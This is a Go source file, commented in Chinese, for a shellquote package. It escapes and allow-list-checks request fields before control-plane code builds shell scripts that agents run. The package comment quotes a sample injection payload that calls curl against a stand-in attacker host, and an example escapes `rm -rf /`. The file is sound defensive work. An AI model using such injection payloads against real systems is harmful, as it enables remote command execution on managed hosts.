// Package shellquote 为「把外部输入拼进 shell 单引号串」提供单一转义实现。
//
// # 为什么要有这个包
//
// 控制面大量 handler 用 fmt.Sprintf 把请求体字段直接拼进要下发到 agent 的
// shell 脚本，未做任何转义。例如（docs/opsmesh-authz-audit-2026-11-04.md 附带发现）：
//
//	script = fmt.Sprintf(`echo "%s=%s" >> users.properties`, req.User, req.Password)
//
// 请求体传 user = `x"; curl -s http://attacker/... ; echo "` 即可闭合双引号并注入
// 任意命令。该脚本最终由 agent 以 `sh -c` 执行（internal/agent/agent.go 的
// exec.Command("sh","-c",command)），注入即命令执行。
//
// 放在 pkg/ 而非 internal/：services/ 下多个微服务模块同样存在该形态（同一份
// 判据不该有 N 份实现），pkg/ 是各模块唯一合法的共享层（见 pkg/sqlguard 先例）。
//
// # 用法
//
// 首选 Quote 得到可安全拼接的单引号串：
//
//	fmt.Sprintf("echo %s >> f", shellquote.Quote(req.User))  // 永远安全
//
// 只允许窄字符集时用 ValidateIdent / ValidatePort 之类白名单，比转义更严。
//
// # 为什么不是简单 strings.ReplaceAll 转义
//
// shell 的单引号语义是「内部一切字面」，唯一无法表示的是单引号本身，标准解法是
// 关闭-转义-重开：' → '\”。任何"把单引号删掉/换成别的"的做法都会改变原义，
// 看着安全实则静默改数据。本包只提供这一条已证语义，不提供别的快捷方式。
package shellquote

import (
	"fmt"
	"strconv"
	"strings"
)

// constSingleQuote 是 shell 单引号字面量的长度（含两端引号）。
const constSingleQuote = 2

// Quote 把任意字符串转成 shell 单引号安全字面量。
//
// 语义保证：返回值的 shell 词法求值结果恒等于原字符串的**字面字节序列**，
// 不含任何可执行结构（因此不可能因注入产生额外命令、管道、重定向）。
//
// 实现：把字符串中的每个 ' 换成 '\”（关闭当前单引号、插入一个转义单引号、
// 重开单引号）。这是 POSIX shell 唯一正确的通用解法。
//
// 例：Quote(`a'; rm -rf /`) 返回 'a'\”; rm -rf /'——shell 求值后得到原字符串本体。
func Quote(s string) string {
	if s == "" {
		return "''"
	}
	// 快速路径：无单引号时直接包一层，省掉替换开销（多数 hostname/version 走这条）。
	if !strings.Contains(s, "'") {
		return "'" + s + "'"
	}
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}

// QuoteJoin 把若干参数转义后用 sep 连接，用于拼 argv。
func QuoteJoin(sep string, args ...string) string {
	if len(args) == 0 {
		return ""
	}
	parts := make([]string, len(args))
	for i, a := range args {
		parts[i] = Quote(a)
	}
	return strings.Join(parts, sep)
}

// QuoteDouble 把 s 转成**双引号包裹**的安全字面量：转义双引号段内全部特殊字符
// （\ " $ 与反引号）。
//
// 为什么除 Quote 之外还需要它：本仓历史上有 269 处调用点用的 shellQuote 产出
// 双引号形状，其中一部分把结果**嵌在既有双引号段内**（如 `".backup %s"`、
// `".read %s"`）——换成单引号语义会改变最终取值（字面单引号会被带进参数），
// 所以修复那批调用点时不能改形状，只能把转义补全。新代码优先用 Quote。
//
// 语义保证：转义后双引号段内不存在任何可展开结构——无变量展开（$VAR）、
// 无命令替换（$(cmd) 与反引号）、无反斜杠歧义（结尾 \ 不再吞掉收尾引号）。
// 与旧实现（只转义 "）的差别恰好就是这三类注入面。
//
// 注意：本函数产出的是「一个完整 shell 词」。不要把它嵌进另一段引号里——
// 那种位置（如 JSON 文本嵌在单引号内的 `-d '{"k":"%s"}'`）请改用 ValidateName
// 这类白名单，因为那里根本没有合法的转义空间。
func QuoteDouble(s string) string {
	return `"` + doubleQuoteEscaper.Replace(s) + `"`
}

// doubleQuoteEscaper 把双引号段内的四个特殊字符转义。
// strings.NewReplacer 单趟扫描：替换产物不再参与匹配，故不存在二次转义；
// 四个模式都是单字符，也无重叠歧义。
var doubleQuoteEscaper = strings.NewReplacer(
	`\`, `\\`,
	`"`, `\"`,
	"$", `\$`,
	"`", "\\`",
)

// ---------------------------------------------------------------- 白名单校验
//
// 白名单比转义更严：当字段的合法域已知且窄（hostname、版本号、端口）时，
// 直接用白名单把一切意外输入挡在门外，比"允许任意串但转义"更安全，
// 且错误信息能点名"哪个字段不合法"，便于运维定位。

// ValidateHost 校验主机名 / IPv4。允许单标签（localhost）与多级域名；
// 不接受 IPv6（含 ':'，agent 端 ssh 目标目前不用）。
func ValidateHost(s string) error {
	if s == "" {
		return fmt.Errorf("host is empty")
	}
	if len(s) > 253 {
		return fmt.Errorf("host too long (%d > 253)", len(s))
	}
	for _, lbl := range strings.Split(s, ".") {
		if lbl == "" || len(lbl) > 63 {
			return fmt.Errorf("invalid host %q: label %q invalid", s, lbl)
		}
		if !isAlnumDash(lbl) {
			return fmt.Errorf("invalid host %q: label %q has illegal chars", s, lbl)
		}
		if lbl[0] == '-' || lbl[len(lbl)-1] == '-' {
			return fmt.Errorf("invalid host %q: label %q starts/ends with '-'", s, lbl)
		}
	}
	return nil
}

// ValidateIdent 校验 shell/系统标识符（用户名、组名等）。POSIX 便携集：
// 字母数字下划线点，不以 '-' 开头，长度 ≤ 32（与 useradd 的常见上限一致）。
func ValidateIdent(s string) error {
	if s == "" {
		return fmt.Errorf("identifier is empty")
	}
	if len(s) > 32 {
		return fmt.Errorf("identifier too long (%d > 32)", len(s))
	}
	for i := 0; i < len(s); i++ {
		c := s[i]
		switch {
		case c >= 'a' && c <= 'z', c >= 'A' && c <= 'Z', c >= '0' && c <= '9':
		case c == '_' || c == '.':
		case c == '-' && i > 0:
		default:
			return fmt.Errorf("invalid identifier %q: char %q not allowed", s, string(c))
		}
	}
	return nil
}

// ValidatePort 校验 TCP 端口（1-65535）。
func ValidatePort(p int) error {
	if p < 1 || p > 65535 {
		return fmt.Errorf("port %d out of range 1-65535", p)
	}
	return nil
}

// ParsePort 解析并校验端口字符串（CLI/JSON 普遍以字符串传端口）。
func ParsePort(s string) (int, error) {
	if s == "" {
		return 0, fmt.Errorf("port is empty")
	}
	n, err := strconv.Atoi(s)
	if err != nil {
		return 0, fmt.Errorf("port %q is not a number", s)
	}
	if err := ValidatePort(n); err != nil {
		return 0, err
	}
	return n, nil
}

// ValidateName 校验通用资源名（单段）：字符集 [A-Za-z0-9_.-]，长度 1..maxLen。
//
// 什么时候用它而不是 Quote/QuoteDouble：当值会被**嵌入既有引号段**、没有合法
// 转义空间时——典型是 JSON 文本整体嵌在 shell 单引号里（`-d '{"k":"%s"}'`）：
// 那里再加一层引号会破坏外层，且 JSON 语法本身还要求转义 " 与 \。
// 把字符集限死是唯一同时满足两层语法的做法。
// ES 节点名/索引名、HBase 列族名、kafka 资源名等窄域标识适用。
func ValidateName(s string, maxLen int) error {
	if s == "" {
		return fmt.Errorf("name is empty")
	}
	if len(s) > maxLen {
		return fmt.Errorf("name too long (%d > %d)", len(s), maxLen)
	}
	for i := 0; i < len(s); i++ {
		if !isNameByte(s[i]) {
			return fmt.Errorf("invalid name %q: char %q not allowed", s, string(s[i]))
		}
	}
	return nil
}

// ValidateQualifiedName 校验可带命名空间前缀的段式名：`seg(:seg)?`，
// 每段 1..maxSegLen、字符集同 ValidateName（如 HBase 的 namespace:table）。
// 段数超过 2 一律拒绝——本仓需要限定名的场景（HBase 表名）最多一层前缀。
func ValidateQualifiedName(s string, maxSegLen int) error {
	if s == "" {
		return fmt.Errorf("qualified name is empty")
	}
	segs := strings.Split(s, ":")
	if len(segs) > 2 {
		return fmt.Errorf("invalid qualified name %q: too many ':' segments", s)
	}
	for _, seg := range segs {
		if err := ValidateName(seg, maxSegLen); err != nil {
			return fmt.Errorf("invalid qualified name %q: %v", s, err)
		}
	}
	return nil
}

// isNameByte 是资源名字符集：字母数字与 . _ -（与 HBase/kafka 既有白名单一致）。
func isNameByte(c byte) bool {
	switch {
	case c >= 'a' && c <= 'z', c >= 'A' && c <= 'Z', c >= '0' && c <= '9':
		return true
	case c == '_' || c == '.' || c == '-':
		return true
	}
	return false
}

// ValidateCmdQuoted 校验将嵌入 **cmd.exe 双引号段** 的值（Windows agent 的
// 脚本经 `cmd /C` 执行，见 internal/agent/agent.go 的 shellCommand）。
//
// 为什么这里必须"拒绝"而不是"转义"：cmd 没有可用于引号段内的转义语法。
//   - 反斜杠不是转义符：`\"` 序列里的 `"` 在 cmd 视角**照样闭合引号**
//     （2026-11-06 本机 cmd 探针实测），闭合后 `& | < >` 立即恢复特殊义；
//   - QuoteDouble 面向 POSIX sh：它补的反斜杠/美元符/反引号转义在 cmd 里
//     会变成字面反斜杠**污染值**（如 Windows 路径被写坏），而救命的那半边
//     （`"` 的转义）在 cmd 里并不存在——POSIX 转义对 cmd 既是错的又是不足的。
//
// cmd 双引号段内能改变解析结果的字节只有五类，全部拒绝：
//
//	"      闭合引号（其后 `& | < >` 恢复特殊义）
//	%      引号内仍做 %VAR% 展开（展开产物可再次影响解析；本仓 agent 子进程
//	       环境已沙箱化，仍按防御性拒绝——REG_EXPAND_SZ 风格的 %VAR% 值不支持）
//	!      延迟展开开启时做 !VAR!（默认关，防御性拒绝）
//	CR/LF  注入新命令行
//	NUL    截断
//
// 其余字节（`& | < > ^` 空白 反斜杠 分号 单引号 中文……）在双引号段内均为
// 字面量（真 cmd 对拍见 quote_test.go）。空串不在此层校验（是否必填由调用方决定）。
func ValidateCmdQuoted(s string, maxLen int) error {
	if len(s) > maxLen {
		return fmt.Errorf("value too long (%d > %d)", len(s), maxLen)
	}
	for i := 0; i < len(s); i++ {
		switch s[i] {
		case '"', '%', '!', '\r', '\n', 0:
			return fmt.Errorf("value %q: char %q not allowed in cmd quoted context", s, string(s[i]))
		}
	}
	return nil
}

// ValidatePath 校验**绝对**路径，且不含 shell 元字符与 .. 穿越。
// 用于 backupDir / file 一类会直接拼进命令的路径字段。
func ValidatePath(p string) error {
	if p == "" {
		return fmt.Errorf("path is empty")
	}
	if !strings.HasPrefix(p, "/") {
		return fmt.Errorf("path %q is not absolute", p)
	}
	if len(p) > 4096 {
		return fmt.Errorf("path too long (%d > 4096)", len(p))
	}
	for _, seg := range strings.Split(p, "/") {
		if seg == ".." {
			return fmt.Errorf("path %q contains '..'", p)
		}
	}
	for i := 0; i < len(p); i++ {
		if strings.IndexByte(" \t\n\r'\"\\$`;&|<>()*?[]{}!~#", p[i]) >= 0 {
			return fmt.Errorf("path %q contains shell metachar %q", p, string(p[i]))
		}
	}
	return nil
}

func isAlnumDash(s string) bool {
	for i := 0; i < len(s); i++ {
		c := s[i]
		switch {
		case c >= 'a' && c <= 'z', c >= 'A' && c <= 'Z', c >= '0' && c <= '9', c == '-':
		default:
			return false
		}
	}
	return true
}
